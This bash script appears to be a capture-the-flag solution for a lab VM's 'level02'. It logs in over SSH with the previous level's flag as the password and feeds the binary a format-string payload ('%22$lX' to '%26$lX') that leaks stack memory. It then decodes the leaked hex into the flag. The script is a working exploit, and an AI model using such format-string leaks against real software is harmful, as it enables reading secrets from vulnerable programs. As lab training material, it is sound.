#!/bin/bash

VM_ID='192.168.56.6'
if [ ! -z "$1" ]; then
    VM_ID="$1"
fi
ACTUAL_LEVEL=$(echo "$0" | grep --only --color=never --max-count=1 "level0[0-9].sh" | head --lines=1 | sed 's/.*level0\([0-9]\).sh.*/\1/g')

if [ -z "${ACTUAL_LEVEL}" ]; then
    echo "cannot get the level number of the actua level"
    exit 1
fi

if [ "$(basename $(pwd))" = "Ressources" ]; then
    cd ..
fi

if [ "$(basename $(pwd))" != "level0${ACTUAL_LEVEL}" ]; then
    echo "not in corresponding directory must be: level0${ACTUAL_LEVEL}"
    exit 1
fi

PREVIOUS_LEVEL="$(( "${ACTUAL_LEVEL}" - 1))"

if [ ! -f "../level0${PREVIOUS_LEVEL}/flag" ]; then
    echo "../level0${PREVIOUS_LEVEL}/flag does not exist"
    exit 1
fi

act_level_password=$(cat "../level0${PREVIOUS_LEVEL}/flag")
if [ -z ${act_level_password} ]; then
    echo "not correct ssh password"
    exit 1
fi

hex_flag=""
hex_flag=$(sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo "%22\$lX %23\$lX %24\$lX %25\$lX %26\$lX" | ./level02' 2> /dev/null | grep '^[0-9A-F]\{16\}')

hex_flag=$(echo "${hex_flag}" | sed 's/\(\([0-9A-F]\{16\} \)*\).*/\1/g')
flag=""

part_number=1
while [ $part_number -le 5 ]
do
    part=$(echo "${hex_flag}" | awk '{ print $'"${part_number}"' }')
    part=$(echo "${part}" | sed 's/[0-9A-F][0-9A-F]/& /g')

    cnt=8
    while [ $cnt -gt 0 ]
    do
        char=$(echo "${part}" | awk '{ print $'"${cnt}"' }')
        char=$(echo -n -e "\x${char}")
        flag="${flag}${char}"

        let cnt--
    done

    let part_number++
done

echo -e "FLAG:\n${flag}"
